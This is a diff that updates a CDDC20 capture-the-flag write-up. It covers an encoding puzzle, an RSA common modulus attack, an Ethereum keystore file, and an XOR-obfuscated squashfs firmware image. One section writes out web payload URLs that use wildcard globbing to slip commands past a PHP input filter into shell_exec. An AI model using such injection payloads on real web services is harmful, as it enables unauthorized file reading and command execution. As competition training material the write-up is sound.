@@ -501,7 +501,7 @@ intStr(int('CDDC20{BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB}'.encode('hex')
 Original:
 '6241883642903BAB50773466B6363B533215606AB008680946B6A567402299A46A19B71AA510A19094173308AB106B5052AA9A13099632AA675311'
 
-Change A and Bs:
+Change intStr encoding:
 '6347880643.209:9567.97362:37635790362021060442:9:8.47173013.100143699:3:0488637.4578918689614:421.888606155:667.7837.7'
 ```
 
@@ -525,22 +525,26 @@ Our request is parsed for presence of special characters and alphanumerical char
 
 If our input is accepted, it is run as `"cat ".implode($_GET['input'])`, where the output will be appended onto the highlight_file, which is a LFI vulnerability
 
-Initially, we approached this problem by retrieving the echo command by using `?` to replace the unaccepted characters
+Initially, we approached this problem to find a way to `ls`, by retrieving the echo command by using `?` to replace the unaccepted characters
 
 ```
-Initial payload:
-?file[]=/&file[]=/???/???/??h?&file[]=/???/*
+Initial payload url:
+https://(domain)/?file[]=/&file[]=/???/???/??h?&file[]=/???/*
 
-which is equivalent to
+equivalent to
 
-> cat / echo /???/*
+shell_exec("cat / /usr/bin/echo /???/*")
 ```
 
-After finding out the flag file can be retrieved in `*/*`, where the flag file is too long to use `?`, we could've just used the cat function they provided instead of wasting our time locating the echo binary
+After finding out the flag file can be retrieved in the subdirectory `*/*`, where the flag file is too long to use `?`, we could've just used the cat function they provided instead of wasting our time locating the echo binary
 
 ```
-Final payload:
-?file[]=*/*
+Final payload url:
+https://(domain)/?file[]=*/*
+
+equivalent to
+
+shell_exec("cat */*")
 ```
 
 Flag: `I forgot what was the flag`
@@ -559,9 +563,9 @@ Running the binary prints out a service menu, where our input is parsed to choos
 
 After trying out the edge cases to this first input parsing, it is found to work on inputting `7`, instead of the required range `1 to 5`
 
-By inputting `7`, the RSA decryption in the binary will store the same modulus when decrypting a message
+(Will add on to this ltr)
 
-As such, we are able to obtain the flag using common modulus attack, as shown in [stackexchange](https://crypto.stackexchange.com/questions/16283/how-to-use-common-modulus-attack)
+As such, we are able to obtain the flag using common modulus attack
 
 Flag: `CDDC20{RSA_and_euclidean_fun}`
 
@@ -627,7 +631,8 @@ with open('upload_decrypted', 'wb') as g:
 ```json
 {
     "version":3,
-    "id":"2d232249-07c7-453b-b2db-a636ff952c88","address":"bc0a23cf362863d841e2cf17722ee7f7add8659e",
+    "id":"2d232249-07c7-453b-b2db-a636ff952c88",
+    "address":"bc0a23cf362863d841e2cf17722ee7f7add8659e",
     "crypto":
     {
         "ciphertext":"3fbbf4573b08192a7567a74677864dd10a8536138607a7952ab816e718b78188",
@@ -1019,6 +1024,19 @@ Flag: `CDDC20{Th4nk_you_IR0NMAN!_I_lov3_3000_S2}`
 
 From the title, it strongly suggests to use XOR
 
-(Gonna complete this writeup ltr)
+![hexeditor]({{ site.baseurl }}/assets/img/CDDC20/Files/firmware.png)
+
+Looking at the hex dump of the file, it shows a pattern right from the start, in places where should have been NULL bytes, i.e. patterns of `2959`
+
+```python
+with open('firmware.bin', 'rb') as fp:
+    byt = fp.read()
+    
+xored = ''.join([chr(ord(b) ^ [0x29, 0x59][i%2]) for i, b in enumerate(byt)])
+```
+
+By iterating through the file XORing with 0x29 and 0x59 consecutively, the output generated gives a filetype of a Squashfs filesystem with a blocksize of 131072 Bytes
+
+After mounting the filesystem, the root directory of the filesystem contains the flag file, thus obtaining the flag
 
 Flag: `CDDC20{x0r_tH3_BE5T_L0Gic4L_oP3rA70R_EVeR}`
